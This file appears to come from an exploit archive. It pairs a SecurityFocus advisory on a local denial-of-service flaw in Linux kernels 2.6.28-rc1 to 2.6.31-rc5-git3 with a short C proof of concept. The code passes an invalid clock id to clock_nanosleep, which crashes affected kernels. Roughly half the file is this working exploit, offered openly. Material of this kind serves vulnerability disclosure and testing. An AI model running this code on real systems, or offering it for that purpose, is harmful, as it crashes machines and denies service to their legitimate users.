/*
source: http://www.securityfocus.com/bid/35976/info

The Linux kernel is prone to a local denial-of-service vulnerability.

Attackers can exploit this issue to crash the affected kernel, denying service to legitimate users. Given the nature of this issue, attackers may also be able to execute arbitrary code, but this has not been confirmed.

This issue was introduced in Linux kernel 2.6.28-rc1 and fixed in 2.6.31-rc5-git3.
*/



#include <time.h>

int main(void)
{
	struct timespec ts;
	ts.tv_sec = 1;
	ts.tv_nsec = 0;

	return clock_nanosleep(4, 0, &ts, NULL);
}